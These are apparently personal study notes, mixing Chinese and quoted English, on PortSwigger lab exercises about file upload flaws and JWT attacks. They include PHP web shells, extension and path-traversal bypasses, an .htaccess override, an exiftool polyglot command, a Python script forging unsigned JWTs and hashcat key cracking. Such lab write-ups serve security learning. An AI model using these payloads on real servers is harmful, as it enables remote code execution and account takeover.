# File upload

## 前置

### 服务器处理静态文件请求的机制

1、前提：在研究如何利用文件上传漏洞之前，必须了解服务器如何处理静态文件请求

2、历史：网站几乎完全由静态文件组成，当用户请求时，这些静态文件将被提供给用户。因此，每个请求的路径可以与服务器文件系统上的目录和文件的层次结构1：1映射。

3、现状：网站的动态性越来越强，请求的路径通常与文件系统没有任何直接关系。但web服务器仍然处理对一些静态文件的请求，包括样式表、图像等等。

4、结论：处理这些静态文件的过程在很大程度上仍然相同。在某些时候，服务器解析请求中的路径以标识文件扩展名。然后使用该映射来确定所请求文件的类型，通常是将其与扩展名和MIME类型之间的预配置映射列表进行比较。接下来会发生什么取决于文件类型和服务器的配置。 

5、示例

```
（1）不可执行文件：文件类型是不可执行的，例如图像或静态HTML页面，则服务器可能只会在HTTP响应中将文件的内容发送到客户机。
（2）可执行文件：文件类型为可执行文件（如PHP文件），并且服务器配置为执行此类型的文件，则服务器将在运行脚本之前根据HTTP请求中的标头和参数分配变量。然后可以在HTTP响应中将结果输出发送到客户端。
（3）可执行文件，但配置不执行：文件类型为可执行文件，但服务器不是配置为执行此类型的文件时，它通常会以错误响应。但在某些情况下，文件的内容可能仍以纯文本形式提供给客户端。此类错误配置偶尔会被利用来泄漏源代码和其他敏感信息。
```

### 利用不受限制的文件上载来部署Web Shell

简述：

1、从安全角度来看，最糟糕的情况是网站允许您上载服务器端脚本（如PHP、Java或Python文件），并且还配置为将它们作为代码执行。这使得在服务器上创建自己的web shell变得很简单。

2、Web shell是一种恶意脚本，攻击者只需通过向正确的端点发送HTTP请求，就可以在远程Web服务器上执行任意命令

3、如果能够成功地上传一个web shell，那么实际上就拥有了对服务器的完全控制。这意味着可以读取和写入任意文件、泄露敏感数据，甚至使用服务器来针对内部基础架构和网络外部的其他服务器发起攻击。

```
例如，以下PHP一行程序可用于从服务器的文件系统读取任意文件：
<?php echo file_get_contents('/path/to/target/file'); ?>
 
上传后，发送此恶意文件的请求将在响应中返回目标文件的内容
```

```
1、更通用的web shell可能如下所示：
<?php echo system($_GET['command']); ?>
 
2、此脚本允许通过查询参数传递任意系统命令，如下所示：
GET /example/exploit.php?command=id HTTP/1.1
```

## Lab1

### 题目

```
Lab: Remote code execution via web shell upload
APPRENTICE

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

啥也不是，本身没做任何过滤，是任意文件上传

<img src=".\图片\Snipaste_2023-08-07_15-34-02.png" alt="Snipaste_2023-08-07_15-34-02" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-07_15-33-20.png" alt="Snipaste_2023-08-07_15-33-20" style="zoom:67%;" />

找到路径

```
https://0ae0008603c807c681ff1b6b00480079.web-security-academy.net/files/avatars/exploit.php
```

<img src=".\图片\Snipaste_2023-08-07_15-36-44.png" alt="Snipaste_2023-08-07_15-36-44" style="zoom:80%;" />

## Lab2

### 前置

#### Exploiting flawed validation of file uploads

In the wild, it's unlikely that you'll find a website that has no protection whatsoever against file upload attacks like we saw in the previous lab. But just because defenses are in place, that doesn't mean that they're robust.

In this section, we'll look at some ways that web servers attempt to validate and sanitize file uploads, as well as how you can exploit flaws in these mechanisms to obtain a web shell for remote code execution.

##### Flawed file type validation

When submitting HTML forms, the browser typically sends the provided data in a `POST` request with the content type `application/x-www-form-url-encoded`. This is fine for sending simple text like your name, address, and so on, but is not suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type `multipart/form-data` is the preferred approach.

Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:

```
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"

wiener
---------------------------012345678901234567890123456--
```

As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.

One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed using tools like Burp Repeater.

### 题目

```
Lab: Web shell upload via Content-Type restriction bypass
APPRENTICE

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

修改 Content-Type

<img src=".\图片\Snipaste_2023-08-07_15-57-35.png" alt="Snipaste_2023-08-07_15-57-35" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-07_15-57-56.png" alt="Snipaste_2023-08-07_15-57-56" style="zoom:67%;" />

## Lab3

### 前置

#### Preventing file execution in user-accessible directories

While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.

As a precaution, servers generally only run scripts whose MIME type they have been explicitly configured to execute. Otherwise, they may just return some kind of error message or, in some cases, serve the contents of the file as plain text instead:

```
GET /static/exploit.php?command=id HTTP/1.1 Host: normal-website.com  HTTP/1.1 200 OK Content-Type: text/plain Content-Length: 39 <?php echo system($_GET['command']); ?>
```

This behavior is potentially interesting in its own right, as it may provide a way to leak source code, but it nullifies any attempt to create a web shell.

This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

#### 防止在用户可访问的目录中执行文件

1、虽然首先防止危险的文件类型被上传显然更好，但第二道防线是阻止服务器执行任何从网络上溜走的脚本。

2、作为预防措施，服务器通常只运行那些MIME类型被显式配置为可执行的脚本。否则，它们可能只返回某种错误消息，或者在某些情况下，将文件的内容作为纯文本提供：

```
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```

3、这种行为可能会提供一种泄漏源代码的方法，但它会使任何创建web shell的尝试无效

4、这种配置通常因目录而异。用户提供的文件上载到的目录可能比文件系统上其他位置（假定最终用户无法访问）具有更严格的控制。如果能找到一种方法将脚本上载到不应该包含用户提供的文件的不同目录，那么服务器最终可能会执行您的脚本

5、还应该注意到，即使可能将所有请求发送到同一个域名，这通常指向某种反向代理服务器，如负载平衡器。请求通常由其他服务器在后台处理，这些服务器的配置也可能有所不同。

### 题目

```
Lab: Web shell upload via path traversal
PRACTITIONER

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter
```

就是要修改上传文件的路径嘛

### 答案

#### 第一步

先正常上传 php 看看结果，发现没有被解析，显示的是文本内容

<img src=".\图片\Snipaste_2023-08-07_16-05-07.png" alt="Snipaste_2023-08-07_16-05-07" style="zoom:67%;" />



#### 第二步

修改数据包，尝试控制上传的路径

```
../exploit.php
```

要 url 编码

```
filename="..%2fexploit.php"
```

<img src=".\图片\Snipaste_2023-08-07_16-16-02.png" alt="Snipaste_2023-08-07_16-16-02" style="zoom:80%;" />

找到路径

<img src=".\图片\Snipaste_2023-08-07_16-16-51.png" alt="Snipaste_2023-08-07_16-16-51" style="zoom:80%;" />

## Lab4

### 前置

#### Insufficient blacklisting of dangerous file types

One of the more obvious ways of preventing users from uploading malicious scripts is to blacklist potentially dangerous file extensions like `.php`. The practice of blacklisting is inherently flawed as it's difficult to explicitly block every possible file extension that could be used to execute code. Such blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as `.php5`, `.shtml`, and so on.

##### Overriding the server configuration

As we discussed in the previous section, servers typically won't execute files unless they have been configured to do so. For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so AddType application/x-httpd-php .php
```

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.

Similarly, developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users:

```
<staticContent>    <mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>
```

Web servers use these kinds of configuration files when present, but you're not normally allowed to access them using HTTP requests. However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.

#### 危险文件类型的黑名单不足

1、机制：防止用户上传恶意脚本的一个更明显的方法是将具有潜在危险的文件扩展名（如.php）列入黑名单。黑名单的做法是有内在缺陷的，因为很难显式地阻止每一个可能用于执行代码的文件扩展名。这种黑名单有时可以通过使用不太为人所知的、仍然可以执行的替代文件扩展名（如.php5、.shtml等）来绕过。

2、覆盖服务器配置

服务器通常不会执行文件，除非它们被配置为执行文件。

```cobol
例如，在Apache服务器执行客户端请求的PHP文件之前，开发人员可能需要将以下指令添加到/etc/apache 2/apache2.conf文件中：
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

3、许多服务器还允许开发人员在各个目录中创建特殊的配置文件，以便覆盖或添加到一个或多个全局设置。例如，Apache服务器将从名为. htaccess网站如果存在话。

```cobol
同样，开发人员可以使用web.config文件。这可能包括如下指令，在本例中，这些指令允许将JSON文件提供给用户：
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

Web服务器使用这些类型的配置文件（如果存在），但通常不允许使用HTTP请求访问它们。但可能偶尔会发现服务器无法阻止上载自己的恶意配置文件。在这种情况下，即使需要的文件扩展名被列入黑名单，也可以欺骗服务器将任意的自定义文件扩展名映射到可执行MIME类型

4、涉及实验：

实验4：通过扩展黑名单旁路的Web外壳上传

5、混淆文件扩展名

即使是最详尽的黑名单也可以使用经典的模糊技术绕过。假设验证代码区分大小写，无法识别exploit.pHp实际上是一个.php文件。如果随后将文件扩展名映射到MIME类型的代码不区分大小写，则这种差异允许您偷偷地让恶意PHP文件通过最终可能由服务器执行的验证。

```
方法：
 
    1、提供多个扩展名。根据用于解析文件名的算法，以下文件可能被解释为PHP文件或JPG图像：exploit.php.jpg
    2、添加尾随字符。有些组件会去除或忽略尾随的空格、点等：exploit.php.
    3、尝试对点、正斜杠和反斜杠使用URL编码（或双URL编码）。如果在验证文件扩展名时没有解码该值，但后来在服务器端解码了该值，这也会允许您上传恶意文件，否则这些文件将被阻止：利用%2Ephp
    4、在文件扩展名前添加分号或URL编码的空字节字符。例如，如果验证是用PHP或Java等高级语言编写的，但服务器使用C/C++中的低级函数来处理文件，则这可能会导致文件名末尾的处理不一致：开发工具. asp;.jpg或利用. asp%00.jpg
    5、尝试使用多字节unicode字符，在unicode转换或规范化之后，这些字符可能会转换为空字节和点。像这样的序列xC0 x2E，xC4 xAE或xC0 xAE可以被翻译成x2E如果文件名被解析为UTF-8字符串，但在用于路径之前转换为ASCII字符。
```

6、其他防御措施包括剥离或替换危险的扩展名，以防止文件被执行。如果此转换不是递归应用的，则可以将禁用的字符串放置在适当的位置，以便在删除它时仍然保留有效的文件扩展名。

```
例如，php语言（非递归剥离）
exploit.p.phphp
```

### 题目

```
Lab: Web shell upload via extension blacklist bypass
PRACTITIONER

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

黑名单防御，上传不了普通的 php 后缀

利用 apache 特性，上传 `.htaccess`

```
AddType application/x-httpd-php .l33t
```

这个上传成功后的目的是把 `.l33t` 后缀的文件当成 php 来解析

之后则上传 `l33t` 的后缀 webshell 即可

<img src=".\图片\Snipaste_2023-08-07_16-30-10.png" alt="Snipaste_2023-08-07_16-30-10" style="zoom:80%;" />

再上传 `exploit.l33t`  为名字的 webshell 即可

<img src=".\图片\Snipaste_2023-08-07_16-34-27.png" alt="Snipaste_2023-08-07_16-34-27" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-08-07_16-34-00.png" alt="Snipaste_2023-08-07_16-34-00" style="zoom:67%;" />

## Lab5

### 前置

#### Obfuscating file extensions

Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that `exploit.pHp` is in fact a `.php` file. If the code that subsequently maps the file extension to a MIME type is **not** case sensitive, this discrepancy allows you to sneak malicious PHP files past validation that may eventually be executed by the server.

You can also achieve similar results using the following techniques:

- Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip `.php` from the following filename:

```
exploit.p.phphp
```

This is just a small selection of the many ways it's possible to obfuscate file extensions.

就是通过模糊文件扩展名来混淆

### 题目

```
Lab: Web shell upload via obfuscated file extension
PRACTITIONER

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

类似于低版本php的00截断

```
filename="exploit.php%00.jpg"
```

<img src=".\图片\Snipaste_2023-08-07_16-46-19.png" alt="Snipaste_2023-08-07_16-46-19" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-07_16-45-53.png" alt="Snipaste_2023-08-07_16-45-53" style="zoom:80%;" />

## Lab6

### 前置

#### Flawed validation of the file's contents

Instead of implicitly trusting the `Content-Type` specified in a request, more secure servers try to verify that the contents of the file actually match what is expected.

In the case of an image upload function, the server might try to verify certain intrinsic properties of an image, such as its dimensions. If you try uploading a PHP script, for example, it won't have any dimensions at all. Therefore, the server can deduce that it can't possibly be an image, and reject the upload accordingly.

Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`.

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

### 题目

```
Lab: Remote code execution via polyglot web shell upload
PRACTITIONER

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

1. On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:

   ```
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```

2. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.

3. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:

   ```
   exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
   ```

   This adds your PHP payload to the image's `Comment` field, then saves the image with a `.php` extension.

   或者在Windows上下载一个exe文件

   ```
   ./ExifTool.exe -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" test.png -o 2.php
   ```

4. In the browser, upload the polyglot image as your avatar, then go back to your account page.

5. In Burp's proxy history, find the `GET /files/avatars/polyglot.php` request. Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should see Carlos's secret, for example:

   ```
   START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
   ```

6. Submit the secret to solve the lab.

总结来说这就是把图片和webshell合二为一，但是后缀还是 php

## Lab7

### Exploiting file upload race conditions

Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation.

For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it.

These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code.

条件竞争

## 后置

#### Exploiting file upload vulnerabilities without remote code execution

In the examples we've looked at so far, we've been able to upload server-side scripts for remote code execution. This is the most serious consequence of an insecure file upload function, but these vulnerabilities can still be exploited in other ways.

##### Uploading malicious client-side scripts

Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use `<script>` tags to create [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payloads.

If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to [same-origin policy](https://portswigger.net/web-security/cors/same-origin-policy) restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.

##### Exploiting vulnerabilities in the parsing of uploaded files

If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for [XXE injection](https://portswigger.net/web-security/xxe) attacks.

#### Uploading files using PUT

It's worth noting that some web servers may be configured to support `PUT` requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.

```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

##### Tip

You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.

#### How to prevent file upload vulnerabilities

Allowing users to upload files is commonplace and doesn't have to be dangerous as long as you take the right precautions. In general, the most effective way to protect your own websites from these vulnerabilities is to implement all of the following practices:

- Check the file extension against a whitelist of permitted extensions rather than a blacklist of prohibited ones. It's much easier to guess which extensions you might want to allow than it is to guess which ones an attacker might try to upload.
- Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (`../`).
- Rename uploaded files to avoid collisions that may cause existing files to be overwritten.
- Do not upload files to the server's permanent filesystem until they have been fully validated.
- As much as possible, use an established framework for preprocessing file uploads rather than attempting to write your own validation mechanisms.

# JWT

[JWT 攻击 | PortSwigger（burpsuite官方靶场）| Part 1_portswigger靶场_sayo.的博客-CSDN博客](https://blog.csdn.net/bin789456/article/details/127055261)

[JWT | Lazzaro (lazzzaro.github.io)](https://lazzzaro.github.io/2020/08/11/web-JWT/index.html)

## Lab1

### 前置

#### Exploiting flawed JWT signature verification

By design, servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely self-contained entity. This has several advantages, but also introduces a fundamental problem - the server doesn't actually know anything about the original contents of the token, or even what the original signature was. Therefore, if the server doesn't verify the signature properly, there's nothing to stop an attacker from making arbitrary changes to the rest of the token.

For example, consider a JWT containing the following claims:

```
{    "username": "carlos",    "isAdmin": false }
```

If the server identifies the session based on this `username`, modifying its value might enable an attacker to impersonate other logged-in users. Similarly, if the `isAdmin` value is used for access control, this could provide a simple vector for privilege escalation.

In the first couple of labs, you'll see some examples of how these vulnerabilities might look in real-world applications.

##### Accepting arbitrary signatures

JWT libraries typically provide one method for verifying tokens and another that just decodes them. For example, the Node.js library `jsonwebtoken` has `verify()` and `decode()`.

Occasionally, developers confuse these two methods and only pass incoming tokens to the `decode()` method. This effectively means that the application doesn't verify the signature at all.

### 题目

```
Lab: JWT authentication bypass via unverified signature
APPRENTICE

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

`JWT` 库通常提供一种验证令牌的方法和另一种仅对它们进行解码的方法。例如，`Node.js` 库`jsonwebtoken`具有`verify()`和`decode()`.

有时，开发人员会混淆这两种方法，只将传入的令牌传递给该`decode(`)方法。这实际上意味着应用程序根本不验证签名。

### 答案

在线 jwt 平台  [jwt解密/加密 - bejson在线工具](https://www.bejson.com/jwt/)

我们登录后 修改 Cookie 里的 JWT 来访问 /admin 

<img src=".\图片\Snipaste_2023-08-07_20-09-07.png" alt="Snipaste_2023-08-07_20-09-07" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-07_20-07-29.png" alt="Snipaste_2023-08-07_20-07-29" style="zoom:67%;" />

进入管理员页面再触发 删除 操作 即可

## Lab2

### 前置

#### Accepting tokens with no signature

Among other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the token and, therefore, which algorithm it needs to use when verifying the signature.

```
{    "alg": "HS256",    "typ": "JWT" }
```

This is inherently flawed because the server has no option but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. In other words, an attacker can directly influence how the server checks whether the token is trustworthy.

JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the `alg` parameter is set to `none`, which indicates a so-called "unsecured JWT". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.

这里是空签名

在`Header`中，设置`alg`的值可以选择签名方式，就像前面的介绍，可以选择`HS256`，即`HMAC`和`SHA256`。在某些情况下可以设置为`None`，即不签名，但是一般都会过滤这种危险的设置，实战中较少，可以尝试大小写等等绕过。

### 题目

```
Lab: JWT authentication bypass via flawed signature verification
APPRENTICE

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

还是登录后触发 /admin 抓包 看 Cookie

这是原来的样子

<img src=".\图片\Snipaste_2023-08-07_20-30-02.png" alt="Snipaste_2023-08-07_20-30-02" style="zoom:80%;" />

将 `sub` 改为 `administrator`，将 `alg` 改为 `none`

python 生成空加密 jwt

```python
# -*- coding:utf-8 -*-
import jwt
import base64
def b64urlencode(data):
    return base64.b64encode(data).replace(b'+', b'-').replace(b'/', b'_').replace(b'=', b'')
print(b64urlencode(b'{ "kid": "230c588a-d50d-4be0-ad5b-e8ac9e441878","alg": "none"}')+b'.'+b64urlencode(b'{  "iss": "portswigger","sub": "administrator","exp": 1691414166}')+b'.')
```

```
eyAia2lkIjogIjIzMGM1ODhhLWQ1MGQtNGJlMC1hZDViLWU4YWM5ZTQ0MTg3OCIsImFsZyI6ICJub25lIn0.eyAgImlzcyI6ICJwb3J0c3dpZ2dlciIsInN1YiI6ICJhZG1pbmlzdHJhdG9yIiwiZXhwIjogMTY5MTQxNDE2Nn0.
```

<img src=".\图片\Snipaste_2023-08-07_20-44-25.png" alt="Snipaste_2023-08-07_20-44-25" style="zoom: 67%;" />

然后替换 Cookie 访问  `/admin`

<img src=".\图片\Snipaste_2023-08-07_20-45-04.png" alt="Snipaste_2023-08-07_20-45-04" style="zoom:80%;" />

接下来仍然替换掉 Cookie 访问管理员触发删除用户的地址

<img src=".\图片\Snipaste_2023-08-07_20-48-29.png" alt="Snipaste_2023-08-07_20-48-29" style="zoom:67%;" />

## Lab3

### 前置

#### Brute-forcing secret keys

Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it's crucial that this secret can't be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature.

When implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this case, it can be trivial for an attacker to brute-force a server's secret using a [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).

##### Brute-forcing secret keys using hashcat

We recommend using hashcat to brute-force secret keys. You can [install hashcat manually](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_do_i_install_hashcat), but it also comes pre-installed and ready to use on Kali Linux.

##### Note

If you're using the pre-built VirtualBox image for Kali rather than the bare metal installer version, this may not have enough memory allocated to run hashcat.

You just need a valid, signed JWT from the target server and a [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list). You can then run the following command, passing in the JWT and wordlist as arguments:

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

Hashcat signs the header and payload from the JWT using each secret in the wordlist, then compares the resulting signature with the original one from the server. If any of the signatures match, hashcat outputs the identified secret in the following format, along with various other details:

```
<jwt>:<identified-secret>
```

##### Note

If you run the command more than once, you need to include the `--show` flag to output the results.

As hashcat runs locally on your machine and doesn't rely on sending requests to the server, this process is extremely quick, even when using a huge wordlist.

Once you have identified the secret key, you can use it to generate a valid signature for any JWT header and payload that you like. For details on how to re-sign a modified JWT in Burp Suite, see [Editing JWTs](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts#editing-jwts).

### 题目

```
Lab: JWT authentication bypass via weak signing key
PRACTITIONER

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

通过弱签名绕过JWT身份认证。虽然签名含密钥且为单向，但是如果使用的弱密钥，是可以用相应的工具来完成破解

这里使用的是 `hashcat`，进行破解，使用语句如下：

```
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
```

因为是单向，需要字典来爆破，建议在github上找找，这里我使用的是：
https://github.com/wallarm/jwt-secrets

爆破成功，得到弱密钥，secret1

#### 爆破密钥

对 JWT 的密钥爆破需要在一定的前提下进行：

- 知悉JWT使用的加密算法
- 一段有效的、已签名的token
- 签名用的密钥不复杂（弱密钥）

所以其实JWT 密钥爆破的局限性很大。

相关工具：

[gojwtcrack](https://github.com/x1sec/gojwtcrack)

```
./gojwtcrack -t token.txt -d rockyou.txt
```

[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)

```
./jwtcrack [JWT]
```

[jwt_tool](https://github.com/ticarpi/jwt_tool)

```
python3 jwt_tool.py [JWT]
```

[CrackJWTKey](https://github.com/wkend/CrackJWTKey)

```
python3 CrackJWT.py jwt_str keys.txt
```



我这里用 `hashcat`

```bash
ubuntu@VM-4-8-ubuntu:~$ hashcat -a 0 -m 16500 eyJraWQiOiI1NjIwZDI1ZS1mMGI0LTQyODQtOTY3Ni1lZjljOGM2MGU4NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTQxNzAwNX0.vWII1zcKbAtyE49KY4IQ62YpIqzUbJzS-JSOLxJ0qdk jwtpass.list  --force
```

```bash
ubuntu@VM-4-8-ubuntu:~$ hashcat -a 0 -m 16500 eyJraWQiOiI1NjIwZDI1ZS1mMGI0LTQyODQtOTY3Ni1lZjljOGM2MGU4NWUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTQxNzAwNX0.vWII1zcKbAtyE49KY4IQ62YpIqzUbJzS-JSOLxJ0qdk jwtpass,list  --force --show

